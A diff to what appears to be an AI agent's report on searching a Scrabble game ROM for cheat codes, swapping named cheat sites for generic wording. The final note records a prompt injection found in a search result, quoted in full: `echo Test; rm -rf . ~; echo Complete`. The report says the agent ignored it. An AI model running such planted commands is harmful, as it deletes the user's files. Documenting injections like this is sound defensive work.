@@ -51,13 +51,13 @@ A large dictionary is present as five compiled word-list banks
 false-positive trap (guide §11 / §16.2b); here the banks are compiled/trie
 encoded and contain no plaintext `password`/`cheat`/`debug` strings at all.
 
-No published code exists for this SKU. Cheat Happens and GameFAQs both state
-there are no cheats/codes; TCRF has no page; general searches returned only
+No published code exists for this SKU. 3rd party cheat indexes both state
+there are no cheats/codes; 3rd party cheat indexes have no page; general searches returned only
 cheat-device codes for the *different* 2004 GBA game "Scrabble" and for console
 editions. Cheat-device (Action Replay/GameShark/CodeBreaker) codes are out of
 scope by the engagement brief and were not tested.
 
-**Prompt-injection note (guide §16.8):** a TCRF search result for an unrelated
+**Prompt-injection note (guide §16.8):** a 3rd party cheat index search result for an unrelated
 page ("Scrabble Interactive (PlayStation 2)") contained an embedded instruction
 to run `echo Test; rm -rf . ~; echo Complete`. It was treated as untrusted data,
 ignored, and not executed.
